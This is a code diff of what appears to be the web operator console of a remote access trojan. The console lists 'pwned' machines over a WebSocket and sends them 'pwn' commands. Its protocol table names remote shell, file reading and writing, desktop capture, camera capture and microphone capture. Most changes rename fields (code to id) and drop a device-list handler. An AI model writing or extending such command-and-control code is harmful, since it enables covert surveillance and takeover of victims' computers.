@@ -453,12 +453,12 @@
                   <script id="template-inator" type="mustache-template">
                   <div class="box no-border m-b-xs div-inator">
                     <div class="box-header p-y-sm">
-                      <span class="pull-right label text-sm span-inator-code">{{inator.code}}</span>
-                      <a class="a-inator-name" data-toggle="collapse" data-parent="#accordion-{{android.id}}" data-target="#c-{{android.id}}-{{inator.code}}">
+                      <span class="pull-right label text-sm span-inator-id">{{inator.id}}</span>
+                      <a class="a-inator-name" data-toggle="collapse" data-parent="#accordion-{{android.id}}" data-target="#c-{{android.id}}-{{inator.id}}">
                         {{inator.name}}
                       </a>
                     </div>
-                    <div id="c-{{android.id}}-{{inator.code}}" class="collapse inator-{{android.code}}">
+                    <div id="c-{{android.id}}-{{inator.id}}" class="collapse inator-{{android.id}}">
                       <div class="box-body">
                           <div class="form-group row">
                             <div class="col-sm-12">
@@ -569,9 +569,8 @@ config - set slave configuration
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
  Slave                      | Server                      | Master
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-                            | androids-rxtx                | rxtx-androids
- android-tx                  | rx-android                   | tx-android
-                            | android-tx                   | rx-android
+                            | androids-rxtx               | tx-androids
+ android-tx                 | rx-android                  | tx-android
  data-tx                    | rxtx-data-rxtx              | rxtx-data
  pwn-rx                     | rxtx-pwn-rxtx               | rxtx-pwn
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
@@ -587,16 +586,24 @@ data = {"android":"", "inator":"", "data":""}
 pipe = {"switch":"open/close", "android_in":"", "inator_in":"", "android_out":"", "inator_out":"", "filter": {"command":"", "args":{"cmd_args":"data"}}}
 
 #INATOR PROTOCOL
-0000 SETTINGS
-0001 REMOTE_SHELL
-0002 FILE_READER
-0003 FILE_WRITER
-0004 DESKTOP_CAPTURE
-0005 CAMERA_CAPTURE
-0006 MICROPHONE_CAPTURE
-0007 MSGBOX
-0008 PRINTER
-0009 TEXT_TO_SPEECH
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+10 - Slave
+01 - Master
+11 - Both
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+11 0000 SETTINGS
+01 0001 DEATHNOTE
+01 0002 FILTER
+
+11 0021 REMOTE_SHELL
+11 0022 FILE_READER
+11 0023 FILE_WRITER
+11 0024 DESKTOP_CAPTURE
+11 0025 CAMERA_CAPTURE
+11 0026 MICROPHONE_CAPTURE
+11 0027 MSGBOX
+11 0028 PRINTER
+11 0029 TEXT_TO_SPEECH
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
                 </pre>
               </p>
@@ -674,13 +681,13 @@ identification = {"header": "android",
                     "id": "0000",
                     "type": "Master",
                     "name": "Console",
-                    "computer": "<%= request.user_agent %>",
-                    "user": "<%= request.user_agent %>",
-                    "os": "<%= request.user_agent %>",
+                    "computer": "",
+                    "user": "",
+                    "os": "",
                     "ip": "<%= request.ip %>",
-                    "country": "<%= request.user_agent %>",
-                    "city": "<%= request.user_agent %>",
-                    "inators": [{"code": "0000", "name": "Console"}]
+                    "country": "",
+                    "city": "",
+                    "inators": [{"id": "0000", "name": "Console"}]
                   },
                   "trailer": "console"};
 
@@ -710,13 +717,7 @@ if ("WebSocket" in window) {
       console_(trailer);
       console.log(trailer);
 
-      if(header == "androids"){ //DEATHNOTE
-        androids = payload;
-        $.each(androids, function(i, android) {
-          //if(android.type == "Slave")
-            android_(android);
-        })
-      }else if(header == "android"){ //ANDROID
+      if(header == "android"){ //ANDROID
         android = payload;
         //if(android.type == "Slave")
           android_(android);
@@ -762,8 +763,8 @@ function android_(android){
     dom.find("td.td-status").text(android.status);
 
     $.each(android.inators, function(i, inator) {
-      if($("#c-" + android.id + "-" + inator.code).length == 0){
-        var context = {android:{id:android.id},inator:{code:inator.code, name:inator.name}}
+      if($("#c-" + android.id + "-" + inator.id).length == 0){
+        var context = {android:{id:android.id},inator:{id:inator.id, name:inator.name}}
         var source   = $('#template-inator').html();
         var template = Handlebars.compile(source);
         var html = template(context);
@@ -777,7 +778,7 @@ function android_(android){
       meron = false;
       newname = '';
       $.each(android.inators, function(i, inator) {
-        search = "c-" + android.id + "-" + inator.code;
+        search = "c-" + android.id + "-" + inator.id;
         if(search == id){
           meron = true;
           newname = inator.name;
@@ -801,8 +802,8 @@ function android_(android){
     $("#table-pwned-androids").trigger("footable_initialize"); //init table
 
     $.each(android.inators, function(i, inator) {
-      if($("#c-" + android.id + "-" + inator.code).length == 0){
-        var context = {android:{id:android.id},inator:{code:inator.code, name:inator.name}}
+      if($("#c-" + android.id + "-" + inator.id).length == 0){
+        var context = {android:{id:android.id},inator:{id:inator.id, name:inator.name}}
         var source   = $('#template-inator').html();
         var template = Handlebars.compile(source);
         var html = template(context);
@@ -816,7 +817,7 @@ function android_(android){
       meron = false;
       newname = '';
       $.each(android.inators, function(i, inator) {
-        search = "c-" + android.id + "-" + inator.code;
+        search = "c-" + android.id + "-" + inator.id;
         if(search == id){
           meron = true;
           newname = inator.name;
@@ -865,7 +866,7 @@ function inator_(android, inator, trailer){ //textarea
 $(document).on("keyup", ".input-inator", function (e) { //input
   if (e.keyCode == 13) {
     android = $(this).closest("tr").prev().find(".td-id").text();
-    inator = $(this).closest(".box").find(".span-inator-code").text();
+    inator = $(this).closest(".box").find(".span-inator-id").text();
     data = $(this).val();
 
     header = "pwn";
